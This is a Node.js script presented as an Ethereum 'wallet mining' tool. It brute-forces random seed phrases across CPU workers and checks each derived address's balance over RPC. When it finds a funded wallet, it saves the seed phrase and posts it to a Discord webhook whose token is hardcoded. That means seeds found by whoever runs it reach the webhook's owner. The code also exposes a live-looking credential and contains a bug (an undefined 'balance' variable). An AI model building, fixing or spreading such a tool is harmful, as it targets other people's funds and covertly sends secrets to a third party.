const bip39 = require('bip39');
const { HDNodeWallet, Mnemonic } = require('ethers');
const Web3 = require('web3').default;
const fs = require('fs');
const cluster = require('cluster');
const config = require('./config.json');
var Queue = require('better-queue');
const { EmbedBuilder, WebhookClient } = require('discord.js');
const webhookId = "1227910695769870446";
const webhookToken = "HZIb6qMoD8V3Fu8RMCsMwLp8MnGouLuVveDKA2eA1tNPUMWU-itneoAayVXFcC3EVlwK";
const webhookClient = new WebhookClient({ id: webhookId, token: webhookToken });
const MemoryStore = require('better-queue-memory');

const send = (title, message) => {
    const embed = new EmbedBuilder()
        .setTitle(title)
        .setColor(0x52c41a);

    webhookClient.send({
        content: message,
        username: 'doge-scan-bot',
        avatarURL: 'https://i.imgur.com/AfFp7pu.png',
        embeds: [embed],
    });
}

const ethServers = config.eth_rpc_servers || []
const numCPUs = config.threads || 4;

function random(array) {
    const index = Math.floor(Math.random() * array.length);
    return array[index];
}

let countNodes = numCPUs > 8 ? Math.round(numCPUs / 2) : 4;
if (countNodes > 16) countNodes = 16;

const nodes = [...Array(countNodes)].map(() => new Web3(new Web3.providers.WebsocketProvider(random(ethServers))))

const generateAddress = () => {
    const mnemonic = bip39.generateMnemonic(256)
    const ethMnemonicInstance = Mnemonic.fromPhrase(mnemonic);
    const ethwallet = HDNodeWallet.fromMnemonic(ethMnemonicInstance, `m/44'/60'/0'/0/0`);
    return { address: ethwallet.address, seed: mnemonic };
}

const getBalance = async (address) => new Promise(async (resolve) => {
    try {
        const node = random(nodes);
        const balance = await node.eth.getBalance(address);
        const blc = Number(node.utils.fromWei(balance, 'ether'));
        resolve(blc);
    } catch (error) {
        resolve(0)
    }
})

let founds = 0
let counts = 0;

const queue = new Queue(function (task, cb) {
    getBalance(task.address)
        .then(balance => {
            cb(null, { ...task, balance });
        })
        .catch(() => {
            cb(null, { ...task, balance: 0 });
        });
}, { concurrent: numCPUs * 2, store: new MemoryStore() });

async function generate() {
    const wallet = generateAddress();
    process.send(wallet);
}

if (cluster.isMaster) {
    console.log(`Start Mining Wallet With: ${numCPUs} CPUs`);
    queue.on('task_finish', function (taskId, wallet) {        
        if (wallet.balance > 0) {
            founds++;
            console.log("\x1b[32m%s\x1b[0m", ">> Success: " + wallet.address);
            var successString = "Wallet: [" + wallet.address + "] - Seed: [" + wallet.seed + "] - Balance: " + balance + " ETH";
            fs.writeFileSync('./match.txt', successString, (err) => {
                if (err) throw err;
            })
            send(successString, 'A Wallet Found Success!!!');
        }
        console.log(`[T:${counts} F:${founds}] - ${wallet.address}: ${wallet.balance} ETH`);
    })

    cluster.on('message', (worker, message) => {
        counts++;
        queue.push(message);
    });

    // Fork workers.
    for (let i = 0; i < numCPUs; i++) {
        cluster.fork(); // Create a new worker process
    }

    cluster.on('exit', (worker, code, signal) => {
        console.log(`worker ${worker.process.pid} died`); // Log when a worker process exits
    });
} else {
    setInterval(generate); // Call the generate function repeatedly with no delay
}
